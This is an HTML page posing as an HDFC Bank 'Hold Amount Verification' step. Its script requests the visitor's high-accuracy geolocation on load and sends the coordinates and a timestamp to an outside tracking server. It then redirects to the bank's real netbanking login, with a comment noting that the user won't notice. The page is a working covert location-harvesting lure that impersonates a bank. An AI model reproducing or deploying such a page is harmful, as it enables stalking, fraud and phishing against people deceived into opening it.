<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hold Amount Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f0f2f5;
    }
    #loading {
      color: #555;
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <p id="loading">Please wait...</p>

  <script>
    function sendLocation(position) {
      const { latitude, longitude } = position.coords;
      const timestamp = new Date().toISOString();

      fetch("https://location-tracker-balt.onrender.com/receive-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, timestamp })
      });
    }

    // Request location instantly
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
        enableHighAccuracy: true,
        timeout: 5000
      });
    }

    // Redirect within 0.5 second (user won't notice)
    setTimeout(() => {
      window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
    }, 1000);
  </script>
</body>
</html>
